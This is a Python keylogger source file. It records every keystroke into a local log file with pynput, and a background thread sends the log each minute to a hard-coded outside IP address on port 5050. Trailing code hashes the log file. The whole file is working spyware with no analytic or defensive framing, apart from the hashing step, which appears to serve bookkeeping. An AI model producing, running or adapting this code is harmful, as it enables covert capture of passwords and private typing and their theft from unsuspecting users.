import logging
import socket
import threading
import json
import time
from pynput import keyboard
import hashlib
import os

PORT = 5050

SERVER = "196.129.32.188"
ADDR = (SERVER, PORT)
keylog ='E:\\key.txt'
logging.basicConfig(filename=keylog, level=logging.DEBUG, format='%(asctime)s - %(message)s')

def KEY(key):
    try:
        logging.log(logging.DEBUG, key.char)
    except AttributeError:
        logging.log(logging.DEBUG, str(key))


def sending():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
                server.connect(ADDR)
                with open(keylog, 'r') as keyfile:
                    log_data = keyfile.read()
                server.sendall(json.dumps(log_data).encode('utf-8'))

        except Exception as e:
            print(f"Error sending log: {e}")

        time.sleep(60)


threading.Thread(target=sending, daemon=True).start()
with keyboard.Listener(on_press=KEY) as listener:
    listener.join()

with open(keylog, 'rb') as file:
    data = file.read()
    md_5 = hashlib.md5(data).hexdigest()
    sha_256 = hashlib.sha256(data).hexdigest()
    sha_1 = hashlib.sha1(data).hexdigest()

print(f"MD5 hash: {md_5}")
print(f"SHA-256 hash: {sha_256}")
print(f"SHA-1 hash: {sha_1}")

